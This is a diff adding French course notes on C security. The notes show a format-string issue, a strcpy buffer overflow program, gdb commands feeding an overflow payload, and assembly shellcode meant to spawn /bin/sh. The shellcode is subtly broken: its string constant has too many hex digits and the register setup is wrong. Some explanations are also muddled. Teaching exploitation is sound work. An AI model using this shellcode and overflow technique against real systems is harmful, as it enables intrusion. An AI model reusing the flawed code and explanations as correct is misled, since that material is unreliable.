@@ -1,0 +1,74 @@
+**Cours 6 : Sécurité et vulnérabilités en C**
+
+**Date : 24-03-2025**
+
+### 1. Gestion de la mémoire et erreurs fréquentes
+
+En programmation C, une mauvaise gestion de la mémoire peut entraîner des erreurs graves, notamment les `segfault`.
+
+#### Exemple de code problématique :
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv) {
+    printf("%s\n", argv[1]);
+    return EXIT_SUCCESS;
+}
+```
+
+#### Problèmes potentiels :
+- `./coucou $'coucou\00'apres'` : Le programme n’imprime que "coucou", ce qui peut être exploité.
+- `printf("%d", ...)` : Peut afficher des valeurs inattendues des registres.
+- `printf("%s %s %s ...")` : Peut provoquer un dépassement de mémoire.
+
+### 2. Dépassement de mémoire (Buffer Overflow)
+
+Le buffer overflow se produit lorsqu'on écrit plus de données que prévu dans un tableau.
+
+#### Exemple de code vulnérable :
+```c
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc, char **argv) {
+    char buf[32];
+    strcpy(buf, argv[1]);
+    printf("Your username is: %s\n", buf);
+    return EXIT_SUCCESS;
+}
+```
+
+Si `buf` reçoit plus de 32 caractères, la mémoire adjacente est corrompue.
+
+### 3. Exploitation avec GDB
+
+Analyse en mémoire avec `gdb` :
+```
+b main
+r "$(python -c 'print("A" * 40)')"
+p main
+n
+x/16a $rsp
+```
+
+### 4. Code en assembleur et exécution malveillante
+
+Exécution d’un shellcode :
+```assembly
+global main
+
+main:
+    xor rax, rax
+    push rax
+    mov rcx, 0x68732f6e669622f2f
+    push rcx
+    mov rdi, rsi
+    mov rsi, rsp
+    mov rdx, rax
+    mov al, 59
+    syscall
+```
+
+Ce programme peut être utilisé pour exécuter `/bin/sh` et obtenir un shell interactif.
